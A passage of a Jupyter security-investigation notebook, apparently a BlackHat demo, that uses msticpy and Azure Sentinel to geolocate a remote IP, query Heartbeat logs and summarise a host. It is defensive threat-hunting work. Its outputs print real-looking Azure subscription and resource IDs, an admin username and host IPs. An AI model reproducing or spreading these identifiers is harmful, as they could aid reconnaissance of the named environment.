SJtYXBfMDliZTU0YTdkZTUxNDZjNWE5NjRjOWNlNDU2N2NiYjMiID48L2Rpdj4KICAgICAgICAKPC9ib2R5Pgo8c2NyaXB0PiAgICAKICAgIAogICAgICAgICAgICB2YXIgbWFwXzA5YmU1NGE3ZGU1MTQ2YzVhOTY0YzljZTQ1NjdjYmIzID0gTC5tYXAoCiAgICAgICAgICAgICAgICAibWFwXzA5YmU1NGE3ZGU1MTQ2YzVhOTY0YzljZTQ1NjdjYmIzIiwKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBjZW50ZXI6IFs1Ni4wLCAyNC4wXSwKICAgICAgICAgICAgICAgICAgICBjcnM6IEwuQ1JTLkVQU0czODU3LAogICAgICAgICAgICAgICAgICAgIHpvb206IDQsCiAgICAgICAgICAgICAgICAgICAgem9vbUNvbnRyb2w6IHRydWUsCiAgICAgICAgICAgICAgICAgICAgcHJlZmVyQ2FudmFzOiBmYWxzZSwKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgKTsKCiAgICAgICAgICAgIAoKICAgICAgICAKICAgIAogICAgICAgICAgICB2YXIgdGlsZV9sYXllcl8zZTM5ZmM1OGE0YzE0YmM2OGFmMjVlOTA4MTM2MzkzZSA9IEwudGlsZUxheWVyKAogICAgICAgICAgICAgICAgImh0dHBzOi8ve3N9LnRpbGUub3BlbnN0cmVldG1hcC5vcmcve3p9L3t4fS97eX0ucG5nIiwKICAgICAgICAgICAgICAgIHsiYXR0cmlidXRpb24iOiAiRGF0YSBieSBcdTAwMjZjb3B5OyBcdTAwM2NhIGhyZWY9XCJodHRwOi8vb3BlbnN0cmVldG1hcC5vcmdcIlx1MDAzZU9wZW5TdHJlZXRNYXBcdTAwM2MvYVx1MDAzZSwgdW5kZXIgXHUwMDNjYSBocmVmPVwiaHR0cDovL3d3dy5vcGVuc3RyZWV0bWFwLm9yZy9jb3B5cmlnaHRcIlx1MDAzZU9EYkxcdTAwM2MvYVx1MDAzZS4iLCAiZGV0ZWN0UmV0aW5hIjogZmFsc2UsICJtYXhOYXRpdmVab29tIjogMTgsICJtYXhab29tIjogMTgsICJtaW5ab29tIjogMCwgIm5vV3JhcCI6IGZhbHNlLCAib3BhY2l0eSI6IDEsICJzdWJkb21haW5zIjogImFiYyIsICJ0bXMiOiBmYWxzZX0KICAgICAgICAgICAgKS5hZGRUbyhtYXBfMDliZTU0YTdkZTUxNDZjNWE5NjRjOWNlNDU2N2NiYjMpOwogICAgICAgIAogICAgCiAgICAgICAgICAgIHZhciBtYXJrZXJfYjM1NjExNmY1NDY3NDlkNTkyNGM0NmIwZGY5NjIyNmEgPSBMLm1hcmtlcigKICAgICAgICAgICAgICAgIFs1Ni4wLCAyNC4wXSwKICAgICAgICAgICAgICAgIHt9CiAgICAgICAgICAgICkuYWRkVG8obWFwXzA5YmU1NGE3ZGU1MTQ2YzVhOTY0YzljZTQ1NjdjYmIzKTsKICAgICAgICAKICAgIAogICAgICAgICAgICB2YXIgaWNvbl82MzM0M2JmZDJmOWM0ZmU2ODdlYjFlYzFjNjBmZGIyMSA9IEwuQXdlc29tZU1hcmtlcnMuaWNvbigKICAgICAgICAgICAgICAgIHsiZXh0cmFDbGFzc2VzIjogImZhLXJvdGF0ZS0wIiwgImljb24iOiAiaW5mby1zaWduIiwgImljb25Db2xvciI6ICJ3aGl0ZSIsICJtYXJrZXJDb2xvciI6ICJyZWQiLCAicHJlZml4IjogImdseXBoaWNvbiJ9CiAgICAgICAgICAgICk7CiAgICAgICAgICAgIG1hcmtlcl9iMzU2MTE2ZjU0Njc0OWQ1OTI0YzQ2YjBkZjk2MjI2YS5zZXRJY29uKGljb25fNjMzNDNiZmQyZjljNGZlNjg3ZWIxZWMxYzYwZmRiMjEpOwogICAgICAgIAogICAgCiAgICAgICAgdmFyIHBvcHVwX2ZlNjhiMzYwYTY0NzRiN2M5NmNhZWEwMTJlZGI0ZWY4ID0gTC5wb3B1cCh7Im1heFdpZHRoIjogIjEwMCUifSk7CgogICAgICAgIAogICAgICAgICAgICB2YXIgaHRtbF8wM2ZhODlkMzc5ZTk0NWViYmY1NjFlMmVlYjU1NmRhZCA9ICQoYDxkaXYgaWQ9Imh0bWxfMDNmYTg5ZDM3OWU5NDVlYmJmNTYxZTJlZWI1NTZkYWQiIHN0eWxlPSJ3aWR0aDogMTAwLjAlOyBoZWlnaHQ6IDEwMC4wJTsiPlR5cGU9Z2VvbG9jYXRpb24sIENvdW50cnlDb2RlPUxULCBDb3VudHJ5TmFtZT1SZXB1YmxpYyBvZiBMaXRodWFuaWEsIExvbmdpdHVkZT0yNC4wLCBMYXRpdHVkZT01Ni4wPGJyPklQOiAzMS4yMjAuNjAuMTA4PC9kaXY+YClbMF07CiAgICAgICAgICAgIHBvcHVwX2ZlNjhiMzYwYTY0NzRiN2M5NmNhZWEwMTJlZGI0ZWY4LnNldENvbnRlbnQoaHRtbF8wM2ZhODlkMzc5ZTk0NWViYmY1NjFlMmVlYjU1NmRhZCk7CiAgICAgICAgCgogICAgICAgIG1hcmtlcl9iMzU2MTE2ZjU0Njc0OWQ1OTI0YzQ2YjBkZjk2MjI2YS5iaW5kUG9wdXAocG9wdXBfZmU2OGIzNjBhNjQ3NGI3Yzk2Y2FlYTAxMmVkYjRlZjgpCiAgICAgICAgOwoKICAgICAgICAKICAgIAogICAgCiAgICAgICAgICAgIG1hcmtlcl9iMzU2MTE2ZjU0Njc0OWQ1OTI0YzQ2YjBkZjk2MjI2YS5iaW5kVG9vbHRpcCgKICAgICAgICAgICAgICAgIGA8ZGl2PgogICAgICAgICAgICAgICAgICAgICBOb25lLCBSZXB1YmxpYyBvZiBMaXRodWFuaWEKICAgICAgICAgICAgICAgICA8L2Rpdj5gLAogICAgICAgICAgICAgICAgeyJzdGlja3kiOiB0cnVlfQogICAgICAgICAgICApOwogICAgICAgIAo8L3NjcmlwdD4= onload=\"this.contentDocument.open();this.contentDocument.write(atob(this.getAttribute('data-html')));this.contentDocument.close();\" allowfullscreen webkitallowfullscreen mozallowfullscreen></iframe></div></div>"
      ],
      "text/plain": [
       "<folium.folium.Map at 0x1e52e6dfa90>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "from msticpy.nbtools.foliummap import get_map_center, FoliumMap\n",
    "from msticpy.sectools.ip_utils import convert_to_ip_entities\n",
    "\n",
    "ip = convert_to_ip_entities(dest_ip)\n",
    "location = get_map_center(ip)\n",
    "folium_map = FoliumMap(location = location, zoom_start=4)\n",
    "md('<h3>Locaiton of remote IP</h3>')\n",
    "icon_props = {'color': 'red'}\n",
    "folium_map.add_ip_cluster(ip_entities=ip, **icon_props)\n",
    "display(folium_map.folium_map)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Host Lookup"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Data Acquisition from Azure Sentinel"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 54,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Please wait. Loading Kqlmagic extension...\n"
     ]
    },
    {
     "data": {
      "application/javascript": [
       "try {IPython.notebook.kernel.reconnect();} catch(err) {;}"
      ],
      "text/plain": [
       "<IPython.core.display.Javascript object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/javascript": [
       "try {IPython.notebook.kernel.execute(\"NOTEBOOK_URL = '\" + window.location + \"'\");} catch(err) {;}"
      ],
      "text/plain": [
       "<IPython.core.display.Javascript object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/javascript": [
       "try {IPython.notebook.kernel.execute(\"NOTEBOOK_URL = '\" + window.location + \"'\");} catch(err) {;}"
      ],
      "text/plain": [
       "<IPython.core.display.Javascript object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<!DOCTYPE html>\n",
       "                            <html><body>\n",
       "\n",
       "                            <!-- h1 id=\"user_code_p\"><b>BKHGZVCTV</b><br></h1-->\n",
       "\n",
       "                            <input  id=\"kql_MagicCodeAuthInput\" type=\"text\" readonly style=\"font-weight: bold; border: none;\" size = '9' value='BKHGZVCTV'>\n",
       "\n",
       "                            <button id='kql_MagicCodeAuth_button', onclick=\"this.style.visibility='hidden';kql_MagicCodeAuthFunction()\">Copy code to clipboard and authenticate</button>\n",
       "\n",
       "                            <script>\n",
       "                            var kql_MagicUserCodeAuthWindow = null;\n",
       "                            function kql_MagicCodeAuthFunction() {\n",
       "                                /* Get the text field */\n",
       "                                var copyText = document.getElementById(\"kql_MagicCodeAuthInput\");\n",
       "\n",
       "                                /* Select the text field */\n",
       "                                copyText.select();\n",
       "\n",
       "                                /* Copy the text inside the text field */\n",
       "                                document.execCommand(\"copy\");\n",
       "\n",
       "                                /* Alert the copied text */\n",
       "                                // alert(\"Copied the text: \" + copyText.value);\n",
       "\n",
       "                                var w = screen.width / 2;\n",
       "                                var h = screen.height / 2;\n",
       "                                params = 'width='+w+',height='+h\n",
       "                                kql_MagicUserCodeAuthWindow = window.open('https://microsoft.com/devicelogin', 'kql_MagicUserCodeAuthWindow', params);\n",
       "\n",
       "                                // TODO: save selected cell index, so that the clear will be done on the lince cell\n",
       "                            }\n",
       "                            </script>\n",
       "\n",
       "                            </body></html>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<!DOCTYPE html>\n",
       "                            <html><body><script>\n",
       "\n",
       "                                // close authentication window\n",
       "                                if (kql_MagicUserCodeAuthWindow && kql_MagicUserCodeAuthWindow.opener != null && !kql_MagicUserCodeAuthWindow.closed) {\n",
       "                                    kql_MagicUserCodeAuthWindow.close()\n",
       "                                }\n",
       "                                // TODO: make sure, you clear the right cell. BTW, not sure it is a must to do any clearing\n",
       "\n",
       "                                // clear output cell\n",
       "                                Jupyter.notebook.clear_output(Jupyter.notebook.get_selected_index())\n",
       "\n",
       "                                // TODO: if in run all mode, move to last cell, otherwise move to next cell\n",
       "                                // move to next cell\n",
       "\n",
       "                            </script></body></html>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<!DOCTYPE html>\n",
       "            <html><body>\n",
       "            <div style=''>\n",
       "            \n",
       "            <button onclick=\"this.style.visibility='visible';\n",
       "            kql_MagicLaunchWindowFunction('kqlmagic/temp_files/f3a669ae-c855-4cff-a13c-d07c018d1304/_52b1ab41-869e-4138-9e40-2a4457f09bf0_at_loganalytics_schema.html', 'fullscreen=no,directories=no,location=no,menubar=no,resizable=yes,scrollbars=yes,status=no,titlebar=no,toolbar=no,', '_52b1ab41_869e_4138_9e40_2a4457f09bf0_at_loganalytics_schema', '');\n",
       "            kql_MagicCloseWindow(kql_Magic__52b1ab41_869e_4138_9e40_2a4457f09bf0_at_loganalytics_schema, -1, -1);\">\n",
       "            popup schema 52b1ab41-869e-4138-9e40-2a4457f09bf0@loganalytics</button>\n",
       "            </div>\n",
       "\n",
       "            <script>\n",
       "            var kql_Magic__52b1ab41_869e_4138_9e40_2a4457f09bf0_at_loganalytics_schema = null;\n",
       "\n",
       "\n",
       "            function kql_MagicCloseWindow(window_obj, obj_secs, itself_secs) {\n",
       "                if (obj_secs >= 0) {\n",
       "                    _timeout = setTimeout(function(){\n",
       "                        window_obj.close();\n",
       "                        if (itself_secs >= 0) {\n",
       "                            __timeout = setTimeout(function(){window.close();}, itself_secs * 1000);\n",
       "                        }\n",
       "                    }, obj_secs * 1000);\n",
       "                } else if (itself_secs >= 0) {\n",
       "                    _timeout = setTimeout(function(){window.close();}, itself_secs * 1000);\n",
       "                }\n",
       "            }\n",
       "\n",
       "            function kql_MagicLaunchWindowFunction(file_path, window_params, window_name, host_or_text) {\n",
       "                var url;\n",
       "                if (host_or_text == 'text') {\n",
       "                    url = ''\n",
       "                } else if (file_path.startsWith('http')) {\n",
       "                    url = file_path;\n",
       "                } else {\n",
       "                    var base_url = '';\n",
       "\n",
       "                    // check if azure notebook\n",
       "                    var azure_host = (host_or_text == null || host_or_text.length == 0) ? 'https://notebooks.azure.com' : host_or_text;\n",
       "                    var start = azure_host.search('//');\n",
       "                    var azure_host_suffix = '.' + azure_host.substring(start+2);\n",
       "\n",
       "                    var loc = String(window.location);\n",
       "                    var end = loc.search(azure_host_suffix);\n",
       "                    start = loc.search('//');\n",
       "                    if (start > 0 && end > 0) {\n",
       "                        var parts = loc.substring(start+2, end).split('-');\n",
       "                        if (parts.length == 2) {\n",
       "                            var library = parts[0];\n",
       "                            var user = parts[1];\n",
       "                            base_url = azure_host + '/api/user/' +user+ '/library/' +library+ '/html/';\n",
       "                        }\n",
       "                    }\n",
       "\n",
       "                    // check if local jupyter lab\n",
       "                    if (base_url.length == 0) {\n",
       "                        var configDataScipt  = document.getElementById('jupyter-config-data');\n",
       "                        if (configDataScipt != null) {\n",
       "                            var jupyterConfigData = JSON.parse(configDataScipt.textContent);\n",
       "                            if (jupyterConfigData['appName'] == 'JupyterLab' && jupyterConfigData['serverRoot'] != null &&  jupyterConfigData['treeUrl'] != null) {\n",
       "                                var basePath = 'C:/Users/pebryan/Documents/source/notebooks' + '/';\n",
       "                                if (basePath.startsWith(jupyterConfigData['serverRoot'])) {\n",
       "                                    base_url = '/files/' + basePath.substring(jupyterConfigData['serverRoot'].length+1);\n",
       "                                }\n",
       "                            }\n",
       "                        }\n",
       "                    }\n",
       "\n",
       "                    // assume local jupyter notebook\n",
       "                    if (base_url.length == 0) {\n",
       "\n",
       "                        var parts = loc.split('/');\n",
       "                        parts.pop();\n",
       "                        base_url = parts.join('/') + '/';\n",
       "                    }\n",
       "                    url = base_url + file_path;\n",
       "                }\n",
       "\n",
       "                window.focus();\n",
       "                var w = screen.width / 2;\n",
       "                var h = screen.height / 2;\n",
       "                params = 'width='+w+',height='+h;\n",
       "                // kql_Magic + window_name should be a global variable \n",
       "                window_obj = window.open(url, window_name, window_params + params);\n",
       "                if (url == '') {\n",
       "                    var el = window_obj.document.createElement('p');\n",
       "                    window_obj.document.body.overflow = 'auto';\n",
       "                    el.style.top = 0;\n",
       "                    el.style.left = 0;\n",
       "                    el.innerHTML = file_path;\n",
       "                    window_obj.document.body.appendChild(el);\n",
       "                }\n",
       "                kql_Magic__52b1ab41_869e_4138_9e40_2a4457f09bf0_at_loganalytics_schema = window_obj;\n",
       "            }\n",
       "            </script>\n",
       "\n",
       "            </body></html>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/javascript": [
       "try {IPython.notebook.kernel.execute(\"NOTEBOOK_URL = '\" + window.location + \"'\");} catch(err) {;}"
      ],
      "text/plain": [
       "<IPython.core.display.Javascript object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 54,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "#HB Query to get Data\n",
    "qry_prov = QueryProvider('LogAnalytics')\n",
    "wkspace = WorkspaceConfig()\n",
    "qry_prov.connect(wkspace.code_connect_str)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 55,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/javascript": [
       "try {IPython.notebook.kernel.execute(\"NOTEBOOK_URL = '\" + window.location + \"'\");} catch(err) {;}"
      ],
      "text/plain": [
       "<IPython.core.display.Javascript object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/javascript": [
       "try {IPython.notebook.kernel.execute(\"NOTEBOOK_URL = '\" + window.location + \"'\");} catch(err) {;}"
      ],
      "text/plain": [
       "<IPython.core.display.Javascript object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/javascript": [
       "try {IPython.notebook.kernel.execute(\"NOTEBOOK_URL = '\" + window.location + \"'\");} catch(err) {;}"
      ],
      "text/plain": [
       "<IPython.core.display.Javascript object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/plain": [
       "'BlackHatDemoHos'"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "query = \"\"\"\n",
    "Heartbeat\n",
    "| where ComputerIP == \"52.255.203.105\"\n",
    "\"\"\"\n",
    "\n",
    "host = qry_prov.exec_query(query)\n",
    "host_name = host['Computer'].iloc[0]\n",
    "display(host_name)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Investigate Host"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Use a notebooklet"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 56,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "6 notebooklets loaded.\n"
     ]
    },
    {
     "data": {
      "application/javascript": [
       "try {IPython.notebook.kernel.execute(\"NOTEBOOK_URL = '\" + window.location + \"'\");} catch(err) {;}"
      ],
      "text/plain": [
       "<IPython.core.display.Javascript object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/javascript": [
       "try {IPython.notebook.kernel.execute(\"NOTEBOOK_URL = '\" + window.location + \"'\");} catch(err) {;}"
      ],
      "text/plain": [
       "<IPython.core.display.Javascript object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Using Open PageRank. See https://www.domcop.com/openpagerank/what-is-openpagerank\n",
      "Loaded providers: LogAnalytics, azuredata, geolitelookup, tilookup\n"
     ]
    }
   ],
   "source": [
    "import msticnb as nb\n",
    "nb.init()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 57,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\pebryan\\Anaconda3\\envs\\dev\\lib\\site-packages\\tqdm\\std.py:668: FutureWarning: The Panel class is removed from pandas. Accessing it from the top-level namespace will also be removed in the next version\n",
      "  from pandas import Panel\n"
     ]
    },
    {
     "data": {
      "text/html": [
       "<h1>Host Entity Summary</h1>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "This shows a summary data for a host. It shows host properties obtained from OMS Heartbeat and Azure API.<br>It also lists Azure Sentinel alerts and bookmakrs related to to the host.<br>Data and plots are stored in the result class returned by this function."
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Getting data from SecurityEvent...\n"
     ]
    },
    {
     "data": {
      "application/javascript": [
       "try {IPython.notebook.kernel.execute(\"NOTEBOOK_URL = '\" + window.location + \"'\");} catch(err) {;}"
      ],
      "text/plain": [
       "<IPython.core.display.Javascript object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/javascript": [
       "try {IPython.notebook.kernel.execute(\"NOTEBOOK_URL = '\" + window.location + \"'\");} catch(err) {;}"
      ],
      "text/plain": [
       "<IPython.core.display.Javascript object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/javascript": [
       "try {IPython.notebook.kernel.execute(\"NOTEBOOK_URL = '\" + window.location + \"'\");} catch(err) {;}"
      ],
      "text/plain": [
       "<IPython.core.display.Javascript object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Getting data from Syslog...\n"
     ]
    },
    {
     "data": {
      "application/javascript": [
       "try {IPython.notebook.kernel.execute(\"NOTEBOOK_URL = '\" + window.location + \"'\");} catch(err) {;}"
      ],
      "text/plain": [
       "<IPython.core.display.Javascript object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/javascript": [
       "try {IPython.notebook.kernel.execute(\"NOTEBOOK_URL = '\" + window.location + \"'\");} catch(err) {;}"
      ],
      "text/plain": [
       "<IPython.core.display.Javascript object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/javascript": [
       "try {IPython.notebook.kernel.execute(\"NOTEBOOK_URL = '\" + window.location + \"'\");} catch(err) {;}"
      ],
      "text/plain": [
       "<IPython.core.display.Javascript object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Unique host found: BlackHatDemoHos\n",
      "Getting data from Heartbeat...\n"
     ]
    },
    {
     "data": {
      "application/javascript": [
       "try {IPython.notebook.kernel.execute(\"NOTEBOOK_URL = '\" + window.location + \"'\");} catch(err) {;}"
      ],
      "text/plain": [
       "<IPython.core.display.Javascript object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/javascript": [
       "try {IPython.notebook.kernel.execute(\"NOTEBOOK_URL = '\" + window.location + \"'\");} catch(err) {;}"
      ],
      "text/plain": [
       "<IPython.core.display.Javascript object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/javascript": [
       "try {IPython.notebook.kernel.execute(\"NOTEBOOK_URL = '\" + window.location + \"'\");} catch(err) {;}"
      ],
      "text/plain": [
       "<IPython.core.display.Javascript object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Getting data from AzureNetworkAnalytics...\n"
     ]
    },
    {
     "data": {
      "application/javascript": [
       "try {IPython.notebook.kernel.execute(\"NOTEBOOK_URL = '\" + window.location + \"'\");} catch(err) {;}"
      ],
      "text/plain": [
       "<IPython.core.display.Javascript object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/javascript": [
       "try {IPython.notebook.kernel.execute(\"NOTEBOOK_URL = '\" + window.location + \"'\");} catch(err) {;}"
      ],
      "text/plain": [
       "<IPython.core.display.Javascript object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/javascript": [
       "try {IPython.notebook.kernel.execute(\"NOTEBOOK_URL = '\" + window.location + \"'\");} catch(err) {;}"
      ],
      "text/plain": [
       "<IPython.core.display.Javascript object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<h2>Host Entity details</h2>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "These are the host entity details gathered from Heartbeat and, if applicable, AzureNetworkAnalytics and Azure management API.<br>The data shows OS information, IP Addresses assigned the host and any Azure VM information available."
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "{ 'AdditionalData': {},\n",
      "  'AzureDetails': { 'ResourceDetails': { 'Admin User': 'mstic_admin',\n",
      "                                         'Azure Location': 'eastus',\n",
      "                                         'Disks': [],\n",
      "                                         'Image': 'Windows-10 rs5-pro',\n",
      "                                         'Network Interfaces': [ '/subscriptions/40dcc8bf-0478-4f3b-b275-ed0a94f2c013/resourceGroups/BlackHatDemo/providers/Microsoft.Network/networkInterfaces/blackhatdemohost86'],\n",
      "                                         'Tags': \"{'Role': 'Demo'}\",\n",
      "                                         'VM Size': 'Standard_B2s'},\n",
      "                    'ResourceGroup': 'BlackHatDemo',\n",
      "                    'ResourceId': '/subscriptions/40dcc8bf-0478-4f3b-b275-ed0a94f2c013/resourceGroups/BlackHatDemo/providers/Microsoft.Compute/virtualMachines/BlackHatDemoHost',\n",
      "                    'ResourceProvider': 'Microsoft.Compute',\n",
      "                    'ResourceType': 'virtualMachines',\n",
      "                    'Solutions': '\"security\", \"changeTracking\", \"networkMonitoring\", \"serviceMap\", '\n",
      "                                 '\"securityCenterFree\", \"securityInsights\", \"windowsFirewall\", '\n",
      "                                 '\"windowsEventForwarding\"',\n",
      "                    'SubscriptionDetails': { 'Display Name': 'ASI Hunting Demo Environment',\n",
      "                                             'Spending Limit': <SpendingLimit.off: 'Off'>,\n",
      "                                             'State': 'SubscriptionState.enabled',\n",
      "                                             'Subscription ID': '40dcc8bf-0478-4f3b-b275-ed0a94f2c013',\n",
      "                                             'Subscription Location': 'Internal_2014-09-01',\n",
      "                                             'Subscription Quota': 'Internal_2014-09-01'},\n",
      "                    'SubscriptionId': '40dcc8bf-0478-4f3b-b275-ed0a94f2c013'},\n",
      "  'Environment': 'Azure',\n",
      "  'HostName': 'BlackHatDemoHos',\n",
      "  'IPAddress': { 'AdditionalData': {},\n",
      "                 'Address': '52.255.203.105',\n",
      "                 'Location': { 'AdditionalData': {},\n",
      "                               'CountryName': 'United States',\n",
      "                               'Latitude': 38.71,\n",
      "                               'Longitude': -78.16,\n",
      "                               'Type': 'geolocation'},\n",
      "                 'Type': 'ipaddress'},\n",
      "  'OSName': '',\n",
      "  'OSType': 'Windows',\n",
      "  'OSVMajorVersion': '10',\n",
      "  'OSVMinorVersion': '0',\n",
      "  'OmsSolutions': [ '\"security\"',\n",
      "                    '\"changeTracking\"',\n",
      "                    '\"networkMonitoring\"',\n",
      "                    '\"serviceMap\"',\n",
      "                    '\"securityCenterFree\"',\n",
      "                    '\"securityInsights\"',\n",
      "                    '\"windowsFirewall\"',\n",
      "                    '\"windowsEventForwarding\"'],\n",
      "  'SourceComputerId': '73a015ec-e2b6-4bf7-b353-ebeafb54254e',\n",
      "  'Type': 'host',\n",
      "  'VMUUID': '3f2b6a14-4c02-41aa-a2e8-6859ee4c7847',\n",
      "  'private_ips': [],\n",
      "  'public_ips': []}\n"
     ]
    },
    {
     "data": {
      "application/javascript": [
       "try {IPython.notebook.kernel.execute(\"NOTEBOOK_URL = '\" + window.location + \"'\");} catch(err) {;}"
      ],
      "text/plain": [
       "<IPython.core.display.Javascript object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/javascript": [
       "try {IPython.notebook.kernel.execute(\"NOTEBOOK_URL = '\" + window.location + \"'\");} catch(err) {;}"
      ],
      "text/plain": [
       "<IPython.core.display.Javascript object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/javascript": [
       "try {IPython.notebook.kernel.execute(\"NOTEBOOK_URL = '\" + window.location + \"'\");} catch(err) {;}"
      ],
      "text/plain": [
       "<IPython.core.display.Javascript object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<p style=''>Found 3 related alerts (2) types</p>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<h2>Timeline of related alerts</h2>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "Each marker on the timeline indicates one or more alerts related to the host."
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "\n",
       "    <div class=\"bk-root\">\n",
       "        <a href=\"https://bokeh.org\" target=\"_blank\" class=\"bk-logo bk-logo-small bk-logo-notebook\"></a>\n",
       "        <span id=\"4479\">Loading BokehJS ...</span>\n",
       "    </div>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/javascript": [
       "\n",
       "(function(root) {\n",
       "  function now() {\n",
       "    return new Date();\n",
       "  }\n",
       "\n",
       "  var force = true;\n",
       "\n",
       "  if (typeof root._bokeh_onload_callbacks === \"undefined\" || force === true) {\n",
       "    root._bokeh_onload_callbacks = [];\n",
       "    root._bokeh_is_loading = undefined;\n",
       "  }\n",
       "\n",
       "  var JS_MIME_TYPE = 'application/javascript';\n",
       "  var HTML_MIME_TYPE = 'text/html';\n",
       "  var EXEC_MIME_TYPE = 'application/vnd.bokehjs_exec.v0+json';\n",
       "  var CLASS_NAME = 'output_bokeh rendered_html';\n",
       "\n",
       "  /**\n",
       "   * Render data to the DOM node\n",
       "   */\n",
       "  function render(props, node) {\n",
       "    var script = document.createElement(\"script\");\n",
       "    node.appendChild(script);\n",
       "  }\n",
       "\n",
       "  /**\n",
       "   * Handle when an output is cleared or removed\n",
       "   */\n",
       "  function handleClearOutput(event, handle) {\n",
       "    var cell = handle.cell;\n",
       "\n",
       "    var id = cell.output_area._bokeh_element_id;\n",
       "    var server_id = cell.output_area._bokeh_server_id;\n",
       "    // Clean up Bokeh references\n",
       "    if (id != null && id in Bokeh.index) {\n",
       "      Bokeh.index[id].model.document.clear();\n",
       "      delete Bokeh.index[id];\n",
       "    }\n",
       "\n",
       "    if (server_id !== undefined) {\n",
       "      // Clean up Bokeh references\n",
       "      var cmd = \"from bokeh.io.state import curstate; print(curstate().uuid_to_server['\" + server_id + \"'].get_sessions()[0].document.roots[0]._id)\";\n",
       "      cell.notebook.kernel.execute(cmd, {\n",
       "        iopub: {\n",
       "          output: function(msg) {\n",
       "            var id = msg.content.text.trim();\n",
       "            if (id in Bokeh.index) {\n",
       "              Bokeh.index[id].model.document.clear();\n",
       "              delete Bokeh.index[id];\n",
       "            }\n",
       "          }\n",
       "        }\n",
